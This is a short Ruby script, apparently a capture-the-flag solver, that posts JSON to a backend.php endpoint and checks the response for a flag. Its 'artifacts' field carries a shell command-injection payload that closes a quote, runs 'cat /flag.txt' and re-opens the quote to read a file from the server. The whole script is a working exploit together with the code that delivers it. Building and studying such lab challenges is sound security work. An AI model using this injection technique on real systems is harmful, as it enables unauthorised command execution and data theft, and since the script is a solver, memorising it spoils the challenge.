require 'httparty'
require 'json'
require_relative 'libronsolve'

BODY = {
  'hoardType' => 'artifact',
  'gold' => '123',
  'gems' => '123',
  'artifacts' => "123';cat /flag.txt;echo '",
}.to_json

result = HTTParty.post("#{ get_url() }/backend.php", body: BODY)

if result.success? && result.parsed_response.is_a?(Hash) && result.parsed_response['message']
  check_flag(result.parsed_response['message'], terminate: true, partial: true)
else
  puts "Something went wrong: #{ result.parsed_response }"
  exit(1)
end
